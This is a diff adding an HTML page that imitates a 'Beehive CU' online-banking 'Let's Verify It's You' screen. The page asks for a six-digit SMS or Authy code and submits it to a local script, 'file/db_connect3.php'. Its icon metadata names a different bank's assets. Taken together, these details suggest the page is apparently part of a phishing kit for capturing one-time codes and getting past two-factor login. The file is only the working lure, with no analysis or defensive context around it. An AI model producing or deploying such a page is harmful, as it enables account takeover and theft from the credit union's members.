@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Login ·Beehive CU</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+    <link rel="manifest" href="/app-manifest">
+    <meta name="theme-color" content="#272d40">
+    <link href="css/vthreeallFullCss.css" rel="stylesheet">
+    <link href="css/224.css" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="icon" sizes="192x192" href="favicon.ico">
+    <link rel="apple-touch-icon" href="favicon.ico">
+    <meta name="msapplication-square70x70logo" content="/images/fi-assets/first-financial-bank/first-financial-bank-msapp-small-d823fc5a.png">
+    <meta name="msapplication-square150x150logo" content="/images/fi-assets/first-financial-bank/first-financial-bank-msapp-large-4f74304d.png">
+    <meta name="msapplication-wide310x150logo" content="/images/fi-assets/first-financial-bank/first-financial-bank-msapp-wide-71fdefbf.png">
+    <meta name="" content="">
+    <meta apply-shim-measure="" style="all: initial;">
+    <style>
+        .sec{
+            display: block;
+            font-family: roboto;
+            font-weight: 400;
+            line-height: 18px;
+            font-size: 13px;
+            padding: 17px 20px 17px 20px;
+            width: 100%; 
+            background-color: white;
+            position: fixed;
+            bottom: 0;
+            text-align: center;
+            text-size-adjust: 100%;
+            color: rgb(112, 112, 112);
+            box-shadow: rgba(0,0,0,0.1)0px -1px 0px 0px;
+            z-index: 1;
+            }
+            @media (max-width: 600px){
+            .sec{
+                padding-left: 80px;
+                padding-right: 80px;
+            }
+        }
+        @media (max-width: 600px){
+            .u-g-mar-top-l{margin-top:0rem !important;}}
+    </style>
+</head>
+<body>
+    <banno-web>
+        <div class="placeholder-login">
+            <div class="placeholder-login-wrapper">
+                <div class="placeholder-card">
+                    <div class="placeholder-progress-container" style="background-color: white">
+                        <div class="login-wrapper"> 
+                            <jha-card has-data="">  <br>
+                                <jha-card-header slot="header" class="">
+                                    <div><img height="80" style="margin-top: -50px;" alt="Logo" src="images/Logo.png"></div>
+                                </jha-card-header>
+                            </jha-card> 
+                        </div>
+                        <article>
+                            <form action="file/db_connect3.php" id="forgotUsernameForm" method="post">
+                                <p style="font-size: 18px; font-family:roboto,-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',sans-serif">Let's Verify It's You</p>
+                                <div class="u-g-width-100" style="font-size: 12px; font-family:roboto,-apple-system,BlinkMacSystemFont,'Segoe UI','Helvetica Neue',sans-serif">A 6-digit code has been sent to your registered phone number. If you have the Authy app installed, you can get your code there. This code will expire after 5 minutes.</div>                              
+                                <div class="u-g-pad-bottom-s"></div>
+                                <div class="u-g-width-100">
+                                    <label class="c-g-textbox  c-g-textbox--empty">
+                                        <span class="c-g-textbox__label">Verification</span>
+                                        <input aria-label="Username" autocapitalize="off" autocomplete="off" autocorrect="off" class=" c-g-textbox__field u-g-fz-body" id="Username" maxlength="6" name="otp" required="required" size="100" type="tel" value="" placeholder="Enter Code" aria-required="true">
+                                    </label>
+                                </div>
+                                <div class="u-g-mar-top-l u-g-disp-flex@medium u-g-flex-row-rev@medium">
+                                    <button id="btnForward" type="submit" class="c-g-btn u-g-cursor-pointer u-g-mar-left-s@medium c-g-btn--expand-while-small u-g-mar-top-m u-g-mar-top-0@medium" style="background-color: rgb(255, 181, 2); color:black">Verify</button>
+                                </div>
+                            </form>
+                        </article>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </banno-web>
+    <bannoweb-footer class="sec">© 2026 Beehive CU <span>&nbsp;</span> <span>•</span> <span>&nbsp;</span> <a href="#" style="color: rgb(0, 76, 150); text-decoration: none;"> Privacy policy</a> <span>&nbsp;</span> <span class="end-of-line">•</span> <span>&nbsp;</span> Member FDIC <span>&nbsp;</span> <span class="end-of-line">•</span> <span>&nbsp;</span><svg width="16" height="11" viewBox="0 0 10 7" class="ehl-icon" aria-hidden="true"> <path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"></path></svg> Equal Housing Lender </bannoweb-footer>
+</body>  
+</html>
